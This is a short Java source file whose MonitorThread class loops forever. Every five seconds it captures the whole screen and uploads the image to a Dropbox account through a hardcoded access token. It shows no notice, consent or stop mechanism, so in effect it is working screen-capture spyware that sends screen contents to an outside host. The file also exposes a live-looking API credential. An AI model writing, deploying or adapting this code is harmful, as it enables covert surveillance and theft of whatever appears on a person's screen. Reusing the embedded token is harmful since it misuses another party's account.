import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MonitorThread extends Thread
{
    String ACCESS_TOKEN;
    DbxRequestConfig config;
    DbxClientV2 client;
    DateFormat dateFormat;
    ByteArrayOutputStream ou;
    ByteArrayInputStream in;
    BufferedImage image;

    public MonitorThread() {
        ACCESS_TOKEN = "vnS_ruF8EnAAAAAAAAAAHkTruL4Hs5Gh4YhX70fBmPzibvRkZPgTGjsWIVg5dRr1";
        config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, ACCESS_TOKEN);
        dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
    }

    public void run()
    {
        for(;;)
        {
            try
            {
                image = new Robot()
                        .createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ou = new ByteArrayOutputStream();
                ImageIO.write(image, "png", ou);
                in = new ByteArrayInputStream(ou.toByteArray());
                client
                        .files()
                        .uploadBuilder("/" + dateFormat.format(new Date()) + ".png")
                        .uploadAndFinish(in);
                ou = null;
                in = null;
                image = null;
                sleep(5000);

            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }
}
